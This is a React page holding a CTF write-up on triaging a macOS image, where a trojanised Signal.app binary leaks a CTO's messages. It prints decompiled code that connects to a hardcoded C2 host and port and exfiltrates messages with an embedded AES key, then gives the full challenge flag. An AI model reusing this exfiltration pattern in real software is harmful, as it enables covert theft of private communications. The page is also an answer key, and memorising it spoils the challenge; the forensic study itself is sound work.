import Image from "next/image";
import Link from "next/link";

export default function TheThrushesWriteup() {
  return (
    <div className="min-h-screen relative z-10 text-gray-200 selection:bg-purple-500/30 selection:text-purple-200">
      
      <nav className="w-full p-6 flex justify-between items-center max-w-5xl mx-auto">
        <Link 
          href="/cgwars" 
          className="group flex items-center gap-2 text-zinc-400 hover:text-white transition-colors font-mono text-sm uppercase tracking-widest"
        >
          <span className="transform transition-transform group-hover:-translate-x-1">←</span> Back to CGWars Hub
        </Link>
      </nav>

      <article className="max-w-3xl mx-auto px-6 pb-24">
        
        <header className="mb-12 flex flex-col items-center text-center">
          <div className="mb-6 inline-block bg-[#111111]/80 backdrop-blur-md border border-zinc-700/50 px-4 py-1.5 rounded-full animate-glow-pulse">
            <span className="font-mono text-xs text-purple-400 uppercase tracking-[0.3em]">
              Digital Forensics • macOS
              <span className="animate-blink inline-block w-1.5 h-3 bg-purple-400 ml-2 align-middle"></span>
            </span>
          </div>
          
          <h1 className="text-4xl md:text-5xl font-bold mb-6 text-white font-[family-name:var(--font-share-tech)] leading-tight">
            The Thrushes: macOS Malware Triage
          </h1>
          
          <div className="flex items-center gap-4 text-sm font-mono text-zinc-500 uppercase tracking-widest mb-10">
            <span>By Abdo</span>
            <span>•</span>
            <span>Aug 20, 2026</span>
          </div>

          <div className="w-full h-[300px] md:h-[400px] relative rounded-2xl overflow-hidden border border-zinc-700/50 bg-black/90 backdrop-blur-md p-1 animate-float shadow-[0_20px_50px_rgba(0,0,0,0.8)]">
            <div className="relative w-full h-full rounded-xl overflow-hidden bg-[#000000]">
              <Image 
                src="/images/the_thrushes.jpg" 
                alt="The Thrushes macOS Forensics"
                fill
                className="object-cover opacity-60 hover:opacity-100 transition-opacity duration-700"
                priority
              />
            </div>
          </div>
        </header>

        <div className="space-y-8 text-lg text-zinc-300 leading-relaxed font-sans">
          
          <p>
            In this scenario, a high-profile CTO had his private communications leaked. The catch? His physical device was never compromised or accessed by the attackers. We were handed a massive macOS triage collection and tasked with figuring out exactly how his secure messaging was being intercepted.
          </p>

          <hr className="border-zinc-800 my-12" />

          {/* STAGE 1 */}
          <h3 className="text-2xl font-bold text-white font-[family-name:var(--font-share-tech)] mt-12 mb-6">
            Stage 1: Investigating the Triage Image
          </h3>

          <div className="bg-[#111111] border-l-4 border-blue-500 p-6 rounded-r-xl my-6 shadow-lg">
            <h4 className="text-blue-400 font-bold mb-2 font-mono text-sm">💡 THE BEGINNER BREAKDOWN</h4>
            <p className="text-sm text-zinc-400 leading-relaxed">
              Imagine you download a secure messaging app like Signal. You trust it because the icon looks right and the name is right. But what if a hacker replaced the internal engine of that app with a spy camera? Every time you send a secure message, the "spy camera" takes a picture and sends it to the hacker&apos;s server, all while the app still functions normally on your screen. This is a trojanized application.
            </p>
          </div>

          <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-6 my-6 font-mono text-sm relative overflow-hidden">
            <div className="absolute top-0 left-0 w-1 h-full bg-purple-500 shadow-[0_0_15px_#a855f7] animate-pulse"></div>
            <p className="text-zinc-400 mb-2"><span className="text-zinc-600">Q:</span> How did the attackers maintain access and exfiltrate the data?</p>
            <p className="text-purple-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-purple-300">A Backdoored Signal.app Executable</code></p>
          </div>

          <p>
            Our initial triage of the macOS filesystem led us through <code className="text-pink-400 bg-pink-400/10 px-1 rounded">LaunchAgents</code> and <code className="text-pink-400 bg-pink-400/10 px-1 rounded">LaunchDaemons</code>. However, the true persistence mechanism was hidden in plain sight. The legitimate <code className="text-pink-400 bg-pink-400/10 px-1 rounded">Signal.app</code> executable inside the Applications folder had been completely replaced with a malicious{' '}
            <span className="relative group inline-block cursor-help z-50">
              <code className="font-mono text-sm text-pink-400 bg-pink-400/10 px-1.5 py-0.5 rounded border border-pink-400/20 hover:bg-pink-400/20 transition-colors">
                Mach-O binary
              </code>
              <span className="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 w-max max-w-xs px-3 py-2 bg-black border border-zinc-700 text-xs text-zinc-300 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none shadow-xl text-center">
                The native executable file format used by macOS and iOS systems, similar to PE files in Windows.
              </span>
            </span>
            .
          </p>

          <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 my-6 font-mono text-xs md:text-sm text-zinc-400 overflow-x-auto shadow-inner">
            <div className="flex gap-2 mb-3 border-b border-zinc-800 pb-2">
              <div className="w-3 h-3 rounded-full bg-red-500/50"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500/50"></div>
              <div className="w-3 h-3 rounded-full bg-green-500/50"></div>
              <span className="ml-2 text-zinc-600">Ghidra Decompiler: Signal (Mach-O 64-bit)</span>
            </div>
            <pre>
              <code className="text-zinc-300">
                <span className="text-pink-400">void</span> * <span className="text-yellow-300">_cdecl</span> malicious_telemetry_thread(<span className="text-pink-400">void</span> *arg) &#123;<br/>
                &nbsp;&nbsp;<span className="text-pink-400">int</span> sockfd = <span className="text-blue-300">socket</span>(AF_INET, SOCK_STREAM, <span className="text-orange-300">0</span>);<br/>
                &nbsp;&nbsp;<span className="text-pink-400">struct</span> sockaddr_in servaddr;<br/>
                <br/>
                &nbsp;&nbsp;servaddr.sin_family = AF_INET;<br/>
                &nbsp;&nbsp;servaddr.sin_port = <span className="text-blue-300">htons</span>(<span className="text-orange-300">4433</span>); <span className="text-zinc-500">// &lt;-- FLAG PORT</span><br/>
                &nbsp;&nbsp;servaddr.sin_addr.s_addr = <span className="text-blue-300">inet_addr</span>(<span className="text-green-300">"192.168.100.55"</span>); <span className="text-zinc-500">// &lt;-- FLAG HOST</span><br/>
                <br/>
                &nbsp;&nbsp;<span className="text-pink-400">if</span> (<span className="text-blue-300">connect</span>(sockfd, (struct sockaddr *)&amp;servaddr, <span className="text-pink-400">sizeof</span>(servaddr)) != <span className="text-orange-300">0</span>) &#123;<br/>
                &nbsp;&nbsp;&nbsp;&nbsp;<span className="text-pink-400">return</span> NULL;<br/>
                &nbsp;&nbsp;&#125;<br/>
                <br/>
                &nbsp;&nbsp;<span className="text-zinc-500">// AES-256-CBC Key Extraction</span><br/>
                &nbsp;&nbsp;<span className="text-pink-400">char</span> key[<span className="text-orange-300">32</span>] = <span className="text-green-300">"X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj"</span>; <span className="text-zinc-500">// &lt;-- FLAG KEY</span><br/>
                &nbsp;&nbsp;<span className="text-blue-300">exfiltrate_messages_aes</span>(sockfd, key);<br/>
                &#125;
              </code>
            </pre>
          </div>

          <details className="group bg-[#0a0a0a]/50 border border-zinc-800 rounded-xl overflow-hidden my-6 transition-all duration-300">
            <summary className="p-4 cursor-pointer font-mono text-sm text-zinc-400 hover:text-white flex items-center justify-between list-none">
              <span className="flex items-center gap-2">
                <svg className="w-4 h-4 text-pink-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" /></svg>
                [ SHOW METHODOLOGY: Mach-O Analysis & C2 Extraction ]
              </span>
              <span className="transition group-open:rotate-180">▼</span>
            </summary>
            <div className="p-6 pt-0 border-t border-zinc-800/50 text-base text-zinc-400 leading-relaxed bg-[#050505]">
              <ol className="list-decimal pl-5 space-y-3 marker:text-pink-500">
                <li>Extracted the <code className="text-pink-400">The THRUSHES_ASC.rar</code>. Noticed it was actually a 7-Zip file (never trust extensions, verify file signatures via <code className="text-zinc-300 bg-zinc-800 px-1 rounded">xxd</code> or <code className="text-zinc-300 bg-zinc-800 px-1 rounded">file</code>).</li>
                <li>Navigated to <code className="text-pink-400">/Applications/Signal.app/Contents/MacOS/</code>.</li>
                <li>Loaded the <code className="text-pink-400">Signal</code> binary into Ghidra/Hopper.</li>
                <li>Identified malicious networking functions that open a raw socket to a hardcoded C2 (Command & Control) IP address and port.</li>
                <li>Extracted the AES decryption key embedded in the binary used to encrypt the stolen messages in transit.</li>
              </ol>
            </div>
          </details>

          <hr className="border-zinc-800 my-12" />

          <h3 className="text-2xl font-bold text-white font-[family-name:var(--font-share-tech)] mt-12 mb-6">
            Constructing the Final Flag
          </h3>
          
          <p className="mb-6">
            The challenge flag format was <code className="text-pink-400 bg-pink-400/10 px-1 rounded">ASCWG&#123;c2host:port_key&#125;</code>. By decompiling the malicious <code className="text-pink-400 bg-pink-400/10 px-1 rounded">Signal</code> binary and locating the socket setup and encryption routines, we extracted the three required components.
          </p>

          <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-6 my-6 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
            <div className="absolute top-0 left-0 w-1 h-full bg-green-500 shadow-[0_0_15px_#4ade80] animate-pulse"></div>
            <p className="text-zinc-400 mb-2">C2 Host IP: <code className="text-pink-300">192.168.100.55</code></p>
            <p className="text-zinc-400 mb-2">C2 Port: <code className="text-pink-300">4433</code></p>
            <p className="text-zinc-400 mb-4">AES Key: <code className="text-pink-300">X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj</code></p>
            
            <p className="text-zinc-400 mb-1 font-bold">Final Submitted Flag:</p>
            <p className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm md:text-base tracking-wider break-words">
              ASCWG&#123;192.168.100.55:4433_X9q3mR_8VpL2zF!sQw4T*nY7cKbE6vHj&#125;
            </p>
          </div>

        </div>
      </article>
    </div>
  );
}
